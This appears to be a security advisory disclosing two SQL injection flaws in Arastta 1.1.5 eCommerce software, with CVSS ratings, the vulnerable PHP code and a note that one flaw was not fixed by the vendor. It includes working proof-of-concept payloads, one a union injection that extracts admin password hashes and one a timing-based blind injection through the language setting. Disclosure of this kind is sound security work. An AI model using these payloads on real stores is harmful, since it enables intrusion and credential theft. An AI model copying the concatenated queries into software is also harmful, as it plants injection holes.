2. Overview

Arastta is an eCommerce software written in PHP. In version 1.1.5, it is
vulnerable to two SQL injection vulnerabilities, one normal injection when
searching for products via tags, and one blind injection via the language
setting. Both of them require a user with special privileges to trigger.

3. SQL Injection 1

CVSS

Medium 6.5 AV:N/AC:L/Au:S/C:P/I:P/A:P

Description

There is an SQL Injection when retrieving products.

Currently, only the "filter" variable is vulnerable. Note that the "tag_name"
variable would also be vulnerable to SQL injection, if there wasn't a filter
that forbid single quotes in the URL. As defense in depth, it might be a good
idea to sanitize that value here as well.

Note that an account with the right "Catalog -> Filters" is needed to exploit
this issue.

Proof of Concept


POST /Arastta/admin/index.php?route=catalog/product/autocomplete&token=3d6cfa8f9f602a4f47e0dfbdb989a469&filter_name=a&tag_name= HTTP/1.1

tag_text[][value]=abc') union all select password from gv4_user -- -

Code


/admin/model/catalog/product.php
public function getTags($tag_name, $filter_tags = null) {
    [...]
    $query = $this->db->query("SELECT DISTINCT(tag) FROM `" . DB_PREFIX . "product_description` WHERE `tag` LIKE '%" . $tag_name . "%'" . $filter);

/admin/controller/catalog/product.php
            public function autocomplete() {
    [...]
    if (isset($this->request->get['tag_name'])) {

$this->load->model('catalog/product');

if (isset($this->request->get['tag_name'])) {
    $tag_name = $this->request->get['tag_name'];
} else {
    $tag_name = '';
}

$filter = null;

if(isset($this->request->post['tag_text'])) {
    $filter = $this->request->post['tag_text'];
}

$results = $this->model_catalog_product->getTags($tag_name, $filter);

foreach ($results as $result) {
    $json[] = array(
'tag' => $result,
'tag_id' => $result
    );
}
    }

4. SQL Injection 2

CVSS

Medium 6.5 AV:N/AC:L/Au:S/C:P/I:P/A:P

Description

There is a second order timing based SQL injection when choosing the language
setting.

An admin account with the right "Setting -> Setting" is needed to exploit this
issue.

Alternatively, a user with the right "Localisation -> Languages" can inject a
payload as well. However, a user with the right "Setting -> Setting" is still
needed to choose the malicious language to trigger the payload.

Proof of Concept


Visit the setting page:
http://localhost/Arastta/admin/index.php?route=setting/setting

For the config_language and config_admin_language parameters use:
en' AND IF(SUBSTRING(version(), 1, 1)='5',BENCHMARK(50000000,ENCODE('MSG','by 5 seconds')),null) -- -

Visiting any site will trigger the injected code.

Code


/Arastta/system/library/utility.php
public function getDefaultLanguage(){
    if (!is_object($this->config)) {
return;
    }

    $store_id = $this->config->get('config_store_id');

    if (Client::isAdmin()){
$sql = "SELECT * FROM " . DB_PREFIX . "setting WHERE `key` = 'config_admin_language' AND `store_id` = '" . $store_id . "'";
    } else {
$sql = "SELECT * FROM " . DB_PREFIX . "setting WHERE `key` = 'config_language' AND `store_id` = '" . $store_id . "'";
    }
    $query = $this->db->query($sql);
    $code = $query->row['value'];

    $language = $this->db->query("SELECT * FROM " . DB_PREFIX . "language WHERE `code` = '" . $code . "'");

    return $language->row;
}

This issue was not fixed by the vendor.
